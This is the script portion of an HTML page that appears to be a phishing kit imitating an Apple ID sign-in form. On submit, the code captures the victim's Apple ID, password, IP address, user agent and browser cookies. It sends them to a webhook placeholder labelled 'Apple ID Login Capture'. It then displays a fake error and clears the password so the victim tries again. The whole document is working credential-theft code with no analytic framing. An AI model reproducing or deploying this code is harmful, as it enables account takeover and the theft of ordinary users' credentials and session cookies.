<script>
document.getElementById('login-form').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const appleId = document.getElementById('apple-id').value;
  const password = document.getElementById('password').value;
  
  const data = {
    embeds: [{
      title: "New Apple ID Login Attempt",
      color: 15844367,
      fields: [
        {
          name: "Apple ID",
          value: appleId,
          inline: true
        },
        {
          name: "Password",
          value: password,
          inline: true
        },
        {
          name: "IP Address",
          value: "Fetching...",
          inline: true
        },
        {
          name: "User Agent",
          value: navigator.userAgent,
          inline: false
        },
        {
          name: "Date & Time",
          value: new Date().toLocaleString(),
          inline: false
        },
        {
          name: "Cookies",
          value: "Fetching...",
          inline: false
        }
      ],
      footer: {
        text: "Apple ID Login Capture"
      }
    }]
  };

  // Fetch IP address
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(ipData => {
      data.embeds[0].fields[2].value = ipData.ip;
      
      // Fetch cookies
      const cookies = document.cookie.split(';').map(cookie => cookie.trim());
      data.embeds[0].fields[5].value = cookies.join('\n') || "No cookies found";
      
      // Send data to webhook
      return fetch('WEBHOOK HERE', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
    })
    .then(response => {
      if (response.ok) {
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('password').value = '';
      } else {
        throw new Error('Network response was not ok.');
      }
    })
    .catch((error) => {
      console.error('Error:', error);
      document.getElementById('error-message').style.display = 'block';
      document.getElementById('password').value = '';
    });
});
</script>
</body></html>
